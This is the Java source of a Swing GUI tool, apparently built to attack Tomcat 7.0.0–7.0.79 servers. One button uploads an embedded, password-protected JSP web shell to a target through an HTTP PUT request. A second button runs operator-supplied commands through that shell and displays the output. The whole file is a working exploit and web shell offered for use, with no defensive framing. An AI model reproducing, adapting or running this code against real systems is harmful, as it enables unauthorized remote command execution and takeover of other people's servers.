package test;

import java.awt.EventQueue;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.border.EmptyBorder;

import com.formdev.flatlaf.themes.FlatMacDarkLaf;

public class testBox extends JFrame {

	private JPanel contentPane;
	private JTextField command;
	private JTextField ip;
	public static String result;
	public static String url;
	public static String code;
	public static String pResult;
	public int r;

	// 生成随机数命名小马
	static Random rd = new Random();
	static int r1 = rd.nextInt(1000);

	/**
	 * Launch the application.
	 */
	public static void MyGETRequest() throws IOException {

		URL urlForGetRequest = new URL(url + "/" + r1 + ".jsp?pwd=023&cmd=" + code);
		String readLine = null;

		HttpURLConnection conection = (HttpURLConnection) urlForGetRequest.openConnection();

		conection.setRequestMethod("GET");
		int responseCode = conection.getResponseCode();
		if (responseCode == HttpURLConnection.HTTP_OK) {
			BufferedReader in = new BufferedReader(new InputStreamReader(conection.getInputStream()));

			StringBuffer response = new StringBuffer();
			while ((readLine = in.readLine()) != null) {
				response.append(readLine);
			}
			in.close();
			result = response.toString();
		} else {
			result = "GET NOT WORKED";
		}
	}

	public static void MyPUTRequest() throws IOException {
		final String POST_PARAMS = "<%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%>\r\n"
				+ "<%!public static String excuteCmd(String c) {\r\n"
				+ "	StringBuilder line = new StringBuilder();\r\n" + "	try {\r\n"
				+ "	Process pro = Runtime.getRuntime().exec(c);\r\n"
				+ "	BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));\r\n"
				+ "	String temp = null;\r\n" + "	while ((temp = buf.readLine()) != null) {\r\n"
				+ "	line.append(temp+\"\\\\n\");}\r\n" + "	buf.close();\r\n" + "	} \r\n"
				+ "	catch (Exception e) {\r\n" + "	line.append(e.getMessage());}\r\n"
				+ "	return line.toString();}\r\n" + "	%>\r\n"
				+ "<%if(\"023\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){\r\n"
				+ "	out.println(excuteCmd(request.getParameter(\"cmd\")));}\r\n" + "	else{out.println(\":-)\");}\r\n"
				+ "	%>";

		System.out.println(POST_PARAMS);
		URL obj = new URL(url + "/" + r1 + ".jsp/");
		System.out.println("[+] ip: " + obj);
		System.out.println("[+] params: " + POST_PARAMS);

		HttpURLConnection postConnection = (HttpURLConnection) obj.openConnection();
		DataOutputStream dataOutputStream = null;

		postConnection.setRequestMethod("PUT");
		postConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
		postConnection.setDoInput(true);
		postConnection.setDoOutput(true);

		dataOutputStream = new DataOutputStream(postConnection.getOutputStream());
		dataOutputStream.writeBytes(POST_PARAMS);
		dataOutputStream.flush();
		dataOutputStream.close();

		int responseCode = postConnection.getResponseCode();
		System.out.println("POST Response Code : " + responseCode);
		System.out.println("POST Response Message : " + postConnection.getResponseMessage());
		if (responseCode == HttpURLConnection.HTTP_CREATED) {
			System.out.println("[+] info: 上传成功！");
			System.out.println("[+] info: 上传地址为：" + obj);
			pResult = "[+] info: 马子上传成功!\r\n[+] info: 请在下方区域进行利用";
			BufferedReader in = new BufferedReader(new InputStreamReader(postConnection.getInputStream()));
			String inputLine;
			StringBuffer response = new StringBuffer();
			while ((inputLine = in.readLine()) != null) {
				response.append(inputLine);

			}
			in.close();
			System.out.println(response.toString());
		} else {
			pResult = "[-] 上传失败！！！";
			System.out.println("PUT NOT WORKED");
		}
	}

	public static void main(String[] args) {
		try {
			UIManager.setLookAndFeel(new FlatMacDarkLaf());
		} catch (Exception ex) {
			System.err.println("Failed to initialize LaF");
		}
		UIManager.put("Button.arc", 2);
		UIManager.put("TextComponent.arc", 2);
		UIManager.put("Component.focusWidth", 2);
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					testBox frame = new testBox();
					frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	public testBox() {
		setTitle("Tomcat 7.0.0 - 7.0.79 \u5229\u7528\u5DE5\u5177    --by Lockly");
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 456, 472);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));

		setContentPane(contentPane);
		contentPane.setLayout(null);

		command = new JTextField();
		command.setBounds(26, 185, 219, 21);
		contentPane.add(command);
		command.setColumns(10);

		JTextArea codeExecuteBack = new JTextArea();
		codeExecuteBack.setLineWrap(true);
		codeExecuteBack.setBounds(26, 235, 383, 168);
		contentPane.add(codeExecuteBack);

		JButton btnNewButton = new JButton("\u6267\u884C");
		btnNewButton.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				if (e.getButton() == MouseEvent.BUTTON1) {
					url = ip.getText();
					code = command.getText();
					try {
						MyGETRequest();
					} catch (IOException e1) {
						System.out.println(e1);
					}
					codeExecuteBack.setText(result);
				}
			}
		});
		btnNewButton.setBounds(249, 184, 87, 23);
		contentPane.add(btnNewButton);

		ip = new JTextField();
		ip.setBounds(26, 47, 219, 21);
		contentPane.add(ip);
		ip.setColumns(10);

		JLabel lblNewLabel = new JLabel("IP: ");
		lblNewLabel.setBounds(26, 22, 219, 15);
		contentPane.add(lblNewLabel);

		JLabel lblNewLabel_1 = new JLabel(
				"\u547D\u4EE4\uFF1A\u957F\u547D\u4EE4\u9700\u8981\u4F7F\u7528base64\u52A0\u5BC6");
		lblNewLabel_1.setBounds(26, 160, 219, 15);
		contentPane.add(lblNewLabel_1);

		JTextArea pocResult = new JTextArea();
		pocResult.setBounds(26, 94, 383, 56);
		contentPane.add(pocResult);

		JButton prove = new JButton("\u4E0A\u4F20\u5C0F\u9A6C");
		prove.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				if (e.getButton() == MouseEvent.BUTTON1) {
					url = ip.getText();
					try {
						MyPUTRequest();
					} catch (IOException e1) {
						System.out.println(e1);
					}
					pocResult.setText(pResult);
				}
			}
		});
		prove.setBounds(249, 46, 87, 23);
		contentPane.add(prove);

		JButton btnNewButton_2 = new JButton("\u6E05\u7A7A");
		btnNewButton_2.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				if (e.getButton() == MouseEvent.BUTTON1) {
					command.setText("");
				}
			}
		});
		btnNewButton_2.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
			}
		});
		btnNewButton_2.setBounds(339, 184, 70, 23);
		contentPane.add(btnNewButton_2);

		JLabel lblNewLabel_2 = new JLabel("Info\uFF1A");
		lblNewLabel_2.setBounds(26, 72, 54, 21);
		contentPane.add(lblNewLabel_2);

		JButton btnNewButton_1 = new JButton("\u6E05\u9664");
		btnNewButton_1.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				if (e.getButton() == MouseEvent.BUTTON1) {
					ip.setText("");
				}
			}
		});
		btnNewButton_1.setBounds(339, 46, 70, 23);
		contentPane.add(btnNewButton_1);

		JLabel lblNewLabel_5 = new JLabel("\u56DE\u663E\uFF1A");
		lblNewLabel_5.setBounds(26, 210, 54, 21);
		contentPane.add(lblNewLabel_5);

	}
}
